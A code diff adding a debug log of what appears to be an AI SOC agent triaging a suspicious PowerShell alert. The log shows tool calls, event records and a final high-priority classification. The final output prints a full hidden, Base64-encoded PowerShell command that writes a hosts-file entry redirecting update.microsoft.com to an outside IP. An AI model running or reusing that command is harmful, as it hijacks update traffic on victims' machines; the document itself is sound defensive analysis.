@@ -1,0 +1,66 @@
+=== DEBUG SESSION START: 2026-03-03T01:58:16.546715+00:00 UTC ===
+
+[PLAYBOOK SELECTION]
+Alert Name: Suspicious PowerShell Script Execution
+Selected Playbook: suspicious_powershell.json
+
+[TOOL CALL]
+Tool: check_hash_reputation
+Arguments: {"hash": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"}
+
+[TOOL RESPONSE]
+VT Results for 9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3 (PowerShell.EXE):
+  - Engines: 0 Malicious | 0 Suspicious
+  - Community Score: -24
+  - Community Votes: 29 Malicious vs 20 Harmless
+
+[TOOL CALL]
+Tool: get_recent_events
+Arguments: {}
+
+[TOOL RESPONSE]
+[
+  {
+    "event_time": "2026-01-27T11:00:10.000Z",
+    "event_name": "ProcessCreation",
+    "user": "a.vargas",
+    "source_ip": "10.40.2.88",
+    "command_line": "C:\\Windows\\System32\\fodhelper.exe"
+  },
+  {
+    "event_time": "2026-01-27T11:02:45.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "source_ip": "10.40.2.88",
+    "scriptblock": "[Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()"  
+  }
+]
+
+[TOOL CALL]
+Tool: get_recent_similar_alerts
+Arguments: {}
+
+[TOOL RESPONSE]
+No recent similar alerts found.
+
+[FINAL LLM OUTPUT]
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-11005",
+    "Start Time": "2026-01-27T11:05:22.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.40.2.88",
+    "Endpoint": "WKSTN-RND-07",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "Description": "An encoded PowerShell command was executed as NT AUTHORITY\\SYSTEM on WKSTN-RND-07 and decodes to a script that attempts to add a hosts file entry mapping update.microsoft.com to 195.54.224.28. The execution was initiated by powershell.exe with parent process cmd.exe and used an encoded (Base64/UTF-16) command, which combined with the SYSTEM context and hosts modification is anomalous and consistent with malicious intent. VirusTotal community reputation for the process hash is negative with more community 'malicious' votes than 'harmless', and a recent fodhelper.exe execution by a.vargas occurred minutes earlier, increasing the likelihood this activity is unauthorized; therefore this alert is classified as High Priority.",
+    "Scriptblock (Encoded)": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABmACAAPQAgACIAJABlAG4AdgA6AHcAaQBuAGQAaQByAFwAcwB5AHMAdABlAG0AMwAyAFwAZAByAGkAdgBlAHIAcwBcAGUAdABjAFwAaABvAHMAdABzACIADQAKACQAZQBuAHQAcgB5ACAAPQAgACIAMQA5ADUALgA1ADUALgAyADIANAAuADIAOAAgAHUAcABkAGEAdABlAC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAiAA0ACgANAAoAaQBmACAAKAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAZgApACAALQBuAG8AdABtAGEAdABjAGgAIAAiADEAOQA1AFwALgA1ADUAXAAuADIAMgA0AFwALgAyADgAXABzACsAdQBwAGQAYQB0AGUAXAAuAG0AaQBjAHIAbwBzAG8AZgB0AFwALgBjAG8AbQAiACkAIAB7AA0ACgAgACAAIAAgACMAIABTAGUAdAAgAHQAaABlACAAZgBpAGwAZQAgAHQAbwAgAE4AbwByAG0AYQBsACAAaQBuACAAYwBhAHMAZQAgAGkAdAAnAHMAIABSAGUAYQBkAC0ATwBuAGwAeQANAAoAIAAgACAAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAAJABmACAALQBOAGEAbQBlACAASQBzAFIAZQBhAGQATwBuAGwAeQAgAC0AVgBhAGwAdQBlACAAJABmAGEAbABzAGUADQAKACAAIAAgACAAQQBkAGQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABmACAALQBWAGEAbAB1AGUAIAAkAGUAbgB0AHIAeQANAAoAfQA=",
+    "Decoded Script Summary": "The decoded command targets %windir%\\system32\\drivers\\etc\\hosts and attempts to add a hosts entry mapping update.microsoft.com to 195.54.224.28, with logic to handle file attributes and write the entry only if not already present.",
+    "Initiating Process": "powershell.exe",
+    "Parent Process": "cmd.exe",
+    "Hash Reputation Summary": "Process SHA256: 9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3 — VirusTotal engines: 0 Malicious | 0 Suspicious; Community Score: -24; Community Votes: 29 Malicious vs 20 Harmless",
+    "Recent Events": "2026-01-27T11:00:10Z ProcessCreation: C:\\Windows\\System32\\fodhelper.exe executed by user a.vargas; 2026-01-27T11:02:45Z PowerShellExecution by NT AUTHORITY\\SYSTEM with a GetCurrent() principal check. No recent similar alerts found."
+  },
+  "classification": "HP"
+}
+
